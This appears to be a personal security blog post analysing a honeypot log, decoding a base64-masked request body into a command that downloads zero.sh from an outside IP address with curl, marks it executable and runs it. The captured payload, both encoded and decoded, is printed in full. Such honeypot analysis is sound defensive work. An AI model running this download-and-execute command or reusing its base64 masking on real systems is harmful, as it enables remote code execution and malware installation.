---
layout: post
title:  "Masked sh command"
date:   2022-10-02 18:25:33 +0100
category: malware
tags: malware reverse-engineering honey-pot ghidra
--- 
The honey pot picked up an interesting request:
```
16:29:23.246 Handling POST to / request from ***.**.***.*
>>>Headers: honey-pot-ip:8080 Keep-Alive Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 application/x-www-form-urlencoded 179 
>>>Body: doAs="echo Y2QgL3RtcCB8fCBjZCAvbW50IHx8ICBjZCAvcm9vdCB8fCBjZCAvOyBjdXJsIC1PIGh0dHA6Ly8xNzYuNjUuMTM3LjUvemVyby5zaDsgY2htb2QgNzc3IHplcm8uc2g7IHNoIHplcm8uc2ggJg== | base64 -d | bash"
16:29:23.246 completed response status 200
```
The requests body is using echo to pipe text encoded in [base64](https://en.wikipedia.org/wiki/Base64) into [GNU base64 decoder](https://www.gnu.org/software/coreutils/base64) to decode it, the decoded out put is then piped into bash (causing bash to execute the decoded text)

If we use GNU base64 to decode the text we get the following:

{% highlight SH %}
cd /tmp || cd /mnt ||  cd /root || cd /; curl -O http://176.65.137.5/zero.sh; chmod 777 zero.sh; sh zero.sh &
{% endhighlight %}

We can see the decoded text is very similar to attacks we have seen before.

The first part `cd /tmp || cd /mnt ||  cd /root || cd /` attempts to change the current directory.
`||` is bash or command, if `cd /tmp` fails then `cd /mnt` is run if that fails then `cd /root` is run etc.

The next part of the command `curl -O http://176.65.137.5/zero.sh; chmod 777 zero.sh; sh zero.sh` attempts to download a sh script and execute it. Unfortunately (though probably for the best) if we use curl to retrieve `http://176.65.137.5/zero.sh` we get 403 Forbidden.

We can only assume that `zero.sh` would have done what we have seen before and downloaded and run malware to the device.

Its curious why does this attack encode the command in base64, could it be doing this to attempting to bypass firewall/anti-malware software?
